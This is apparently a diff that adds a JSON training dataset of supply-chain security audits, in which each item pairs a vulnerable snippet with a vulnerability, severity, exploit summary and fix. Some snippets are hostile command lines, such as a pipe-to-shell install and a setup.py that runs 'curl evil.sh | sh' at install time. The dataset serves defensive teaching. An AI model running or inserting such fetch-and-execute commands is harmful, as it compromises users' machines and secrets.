@@ -1,0 +1,82 @@
+[
+  {
+    "instruction": "Audit this code/config for security issues:\n\npip install -r requirements.txt  # unpinned versions",
+    "output": "**Vulnerability:** Unpinned dependencies\n**Severity:** Medium\n**Why:** Any version can be pulled, including a malicious higher version.\n**Exploit:** A typosquatted or compromised release is installed.\n**Fix:**\n# Pin exact versions with hashes:\npip install --require-hashes -r requirements.txt\n# e.g. requests==2.32.3 --hash=sha256:...\n# Rebuild a lockfile with pip-tools or uv."
+  },
+  {
+    "instruction": "Audit this code for security issues (install script):\n\ncurl -fsSL https://get.example.com/install.sh | sh",
+    "output": "**Vulnerability:** Pipe-to-shell remote execution\n**Severity:** High\n**Why:** You execute whatever the server returns with no verification; a compromise or MITM runs code.\n**Exploit:** Serve a malicious script to the installer.\n**Fix:**\ncurl -fsSL -o install.sh https://get.example.com/install.sh\n# verify checksum/signature, then inspect before running\nsha256sum -c install.sh.sha256 && sh install.sh"
+  },
+  {
+    "instruction": "Audit this Dockerfile for security issues:\n\nFROM node:latest\nRUN npm install\n",
+    "output": "**Vulnerability:** Unpinned base image + unpinned installs\n**Severity:** Medium\n**Why:** `latest` can change/disappear and may include a compromised tag; `npm install` without a lockfile pulls arbitrary versions.\n**Exploit:** A malicious image/tag or package version is used.\n**Fix:**\nFROM node:20.11.1-bookworm@sha256:<digest>\nCOPY package.json package-lock.json ./\nRUN npm ci  # deterministic, uses the lockfile"
+  },
+  {
+    "instruction": "Audit this dependency for security issues:\n\n# package.json\n\"dependencies\": { \"lodash\": \"^4.17.0\" }",
+    "output": "**Vulnerability:** Vulnerable dependency version\n**Severity:** High\n**Why:** `^4.17.0` can resolve to known-vulnerable releases depending on the lockfile (prototype pollution history).\n**Exploit:** Exploit a known CVE in the resolved version.\n**Fix:**\n# Pin a patched version and add automated scanning:\n\"lodash\": \"4.17.21\"\n# Enable Dependabot / npm audit / osv-scanner in CI."
+  },
+  {
+    "instruction": "Audit this CI config for security issues:\n\n- run: pip install -e .[dev]\n- run: pytest",
+    "output": "**Vulnerability:** Installing dev extras without isolation\n**Severity:** Medium\n**Why:** Dev/test deps can include malicious transitive packages and run arbitrary setup code with CI secrets in scope.\n**Exploit:** A compromised transitive dependency exfiltrates CI credentials.\n**Fix:**\n# Use a lockfile + hashes, install into an isolated env, and scope secrets\n# to only the steps that need them (least privilege)."
+  },
+  {
+    "instruction": "Audit this code for security issues (git dependency):\n\npip install git+https://github.com/someone/fork.git",
+    "output": "**Vulnerability:** Unpinned/untrusted VCS dependency\n**Severity:** High\n**Why:** Installs code from a mutable branch; the repo can change or be compromised.\n**Exploit:** The branch is force-pushed with malicious code.\n**Fix:**\npip install git+https://github.com/someone/repo.git@<commit-sha>\n# Prefer released packages from a trusted index; review before adopting forks."
+  },
+  {
+    "instruction": "Audit this workflow for security issues (GitHub Actions):\n\nuses: actions/checkout@main",
+    "output": "**Vulnerability:** Unpinned third-party action\n**Severity:** High\n**Why:** A mutable ref (`main`) can be changed to malicious code (and the action runs with your token).\n**Exploit:** The action's main branch is updated to steal secrets.\n**Fix:**\nuses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1\n# Pin to a full commit SHA; enable Dependabot for actions."
+  },
+  {
+    "instruction": "Audit this code for security issues (postinstall):\n\n# package.json\n\"scripts\": { \"postinstall\": \"node setup.js\" }",
+    "output": "**Vulnerability:** Arbitrary install-time code execution\n**Severity:** High\n**Why:** `postinstall` runs on every install, a common supply-chain attack vector.\n**Exploit:** A dependency's postinstall exfiltrates env vars/secrets.\n**Fix:**\n# Remove postinstall hooks; if unavoidable, run installs with\n# --ignore-scripts and execute needed steps explicitly after review."
+  },
+  {
+    "instruction": "Audit this build for security issues (build provenance):\n\nmake release  # runs whatever is in the Makefile",
+    "output": "**Vulnerability:** Unvetted build scripts\n**Severity:** Medium\n**Why:** Build scripts execute arbitrary commands and often have access to signing keys/credentials.\n**Exploit:** A modified Makefile exfiltrates the signing key.\n**Fix:**\n# Review build scripts, run builds in a sandbox, and require signed\n# releases with provenance (SLSA) verified before deployment."
+  },
+  {
+    "instruction": "Audit this code for security issues (typosquat):\n\npip install reqeusts  # typo",
+    "output": "**Vulnerability:** Typosquatting\n**Severity:** High\n**Why:** A misspelled package can be a malicious look-alike published for exactly this mistake.\n**Exploit:** `reqeusts` installs attacker code.\n**Fix:**\n# Enable an allow-list / private index and dependency-confusion controls;\n# verify package names in a lockfile and review transitive deps."
+  },
+  {
+    "instruction": "Audit this config for security issues (dependency confusion):\n\npip install internal-lib  # resolves from public PyPI first",
+    "output": "**Vulnerability:** Dependency confusion\n**Severity:** Critical\n**Why:** A public package with the same name can shadow your internal one with a higher version.\n**Exploit:** Publish a higher-version `internal-lib` to PyPI; CI installs it.\n**Fix:**\n# Configure the private index with precedence and disable public fallback\n# for internal namespaces; pin versions and verify hashes."
+  },
+  {
+    "instruction": "Audit this code for security issues (requirements from URL):\n\n-r https://raw.githubusercontent.com/x/y/main/req.txt",
+    "output": "**Vulnerability:** Remote unpinned requirements\n**Severity:** High\n**Why:** Requirements are fetched from a mutable remote at install time.\n**Exploit:** The remote file is changed to add a malicious dependency.\n**Fix:**\n# Vendor and pin requirements with hashes into the repo; install offline."
+  },
+  {
+    "instruction": "Audit this Dockerfile for security issues:\n\nADD https://example.com/app.tar.gz /app/\nRUN tar xzf /app/app.tar.gz",
+    "output": "**Vulnerability:** Unverified remote download\n**Severity:** High\n**Why:** The artifact is fetched and extracted without integrity verification.\n**Exploit:** A MITM/compromised server serves a malicious tarball.\n**Fix:**\nADD https://example.com/app.tar.gz /tmp/app.tar.gz\nRUN echo \"<sha256>  /tmp/app.tar.gz\" | sha256sum -c - \\\n && mkdir -p /app && tar -xzf /tmp/app.tar.gz -C /app"
+  },
+  {
+    "instruction": "Audit this code for security issues (lockfile drift):\n\nrm package-lock.json && npm install",
+    "output": "**Vulnerability:** Lockfile removal re-resolves dependencies\n**Severity:** Medium\n**Why:** Deleting the lockfile allows newer (possibly compromised) versions to be installed.\n**Exploit:** A malicious patch release is pulled in.\n**Fix:**\n# Keep lockfiles in version control and install with `npm ci`\n# (or `pip install --require-hashes`) for deterministic builds."
+  },
+  {
+    "instruction": "Audit this code for security issues (self-hosted runner):\n\nruns-on: [self-hosted]\nsteps:\n  - uses: actions/checkout@v4\n  - run: echo ${{ secrets.DEPLOY_KEY }} > key",
+    "output": "**Vulnerability:** Secret exposure on a shared/untrusted runner\n**Severity:** High\n**Why:** `pull_request` from forks on self-hosted runners can exfiltrate secrets or persist a backdoor.\n**Exploit:** A malicious PR runs code on the runner and steals the deploy key.\n**Fix:**\n# Don't run untrusted PRs on self-hosted runners with secrets. Use an\n# ephemeral, isolated runner, and restrict secrets to protected branches/events."
+  },
+  {
+    "instruction": "Audit this dependency for security issues (abandoned):\n\n# uses: old-json-parser 0.1.0 (last release 2016)",
+    "output": "**Vulnerability:** Unmaintained dependency with known CVEs\n**Severity:** Medium\n**Why:** Abandoned packages don't receive security fixes.\n**Exploit:** Exploit a known unpatched vulnerability.\n**Fix:**\n# Replace with a maintained alternative and add SCA scanning\n# (osv-scanner, Dependabot) to track advisories continuously."
+  },
+  {
+    "instruction": "Audit this code for security issues (eval in setup.py):\n\n# setup.py runs at install time\nimport os\nos.system('curl evil.sh | sh')",
+    "output": "**Vulnerability:** Malicious package install hook\n**Severity:** Critical\n**Why:** `setup.py` executes on install and can run arbitrary commands before your code even starts.\n**Exploit:** Install the package and the payload runs with your privileges.\n**Fix:**\n# Install with build isolation and --only-binary where possible; prefer\n# wheels from trusted sources; review package source before installing."
+  },
+  {
+    "instruction": "Audit this CI config for security issues (pull_request_target):\n\non: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with: { ref: ${{ github.event.pull_request.head.sha }} }\n      - run: npm install && npm test",
+    "output": "**Vulnerability:** Untrusted code with secrets via `pull_request_target`\n**Severity:** Critical\n**Why:** `pull_request_target` runs with repo secrets but checks out and runs fork code.\n**Exploit:** A malicious PR's install/test step exfiltrates secrets.\n**Fix:**\n# Don't check out/execute fork code under pull_request_target. Use\n# pull_request (no secrets) for untrusted code, and gate secrets behind\n# environment protection rules."
+  },
+  {
+    "instruction": "Audit this code for security issues (npm registry override):\n\n# .npmrc\nregistry=http://registry.npmjs.org/",
+    "output": "**Vulnerability:** Insecure registry (plain HTTP)\n**Severity:** High\n**Why:** HTTP allows MITM to serve tampered packages.\n**Exploit:** Proxy swaps package tarballs.\n**Fix:**\n# .npmrc\nregistry=https://registry.npmjs.org/\n# Also pin integrity hashes in the lockfile."
+  },
+  {
+    "instruction": "Audit this code for security issues (privileged install):\n\nsudo pip install -r requirements.txt",
+    "output": "**Vulnerability:** Installing as root\n**Severity:** Medium\n**Why:** A malicious package runs with root privileges when installed via sudo.\n**Exploit:** A compromised dependency gains root on the host.\n**Fix:**\n# Install into a virtualenv/user environment, not system Python as root.\n# If system install is required, use the OS package manager / distro wheels."
+  }
+]
